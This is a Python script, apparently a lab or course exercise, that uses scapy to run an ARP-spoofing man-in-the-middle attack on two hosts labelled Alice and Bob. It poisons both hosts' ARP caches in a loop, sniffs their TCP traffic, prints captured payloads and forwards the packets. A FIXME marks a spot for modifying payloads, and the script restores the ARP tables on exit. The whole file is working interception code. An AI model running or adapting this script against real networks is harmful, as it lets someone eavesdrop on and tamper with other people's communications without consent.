#!/usr/bin/python3
# coding: UTF-8

import argparse
import time

from multiprocessing import Process
from scapy.all import Ether, ARP, TCP, IP, Raw, send, sniff, srp1, sendp

def get_mac(ip):
    reply = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip, op='who-has'), verbose=0)
    assert reply is not None
    return reply.src

def spoof(target_ip, dest_ip):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=dest_ip, op='is-at')
    send(arp_response, verbose=0)

def restore(target_ip, dest_ip):
    target_mac = get_mac(target_ip)
    dest_mac = get_mac(dest_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=dest_ip, hwsrc=dest_mac, op='is-at')
    send(arp_response, verbose=0)

def modify_and_forward(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        new_dst_mac = get_mac(packet[IP].dst)

        if Raw in packet:
            payload = packet[Raw].load
            print(f"Received: {payload}")
            # FIXME
        
        new_packet = Ether(dst=new_dst_mac) / packet[IP]
        del new_packet[IP].chksum
        del new_packet[TCP].chksum
        sendp(new_packet, verbose=0)

def sniff_tcp():
    sniff(filter="tcp", prn=modify_and_forward)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('alice', help='Alice\'s IP address')
    parser.add_argument('bob', help='Bob\'s IP address')

    args = parser.parse_args()
    alice = args.alice
    bob = args.bob

    try:
        sniff_process = Process(target=sniff_tcp)
        sniff_process.start()
        while True:
            spoof(alice, bob)
            spoof(bob, alice)
            time.sleep(2)
    except KeyboardInterrupt:
        restore(alice, bob)
        restore(bob, alice)

if __name__ == '__main__':
    main()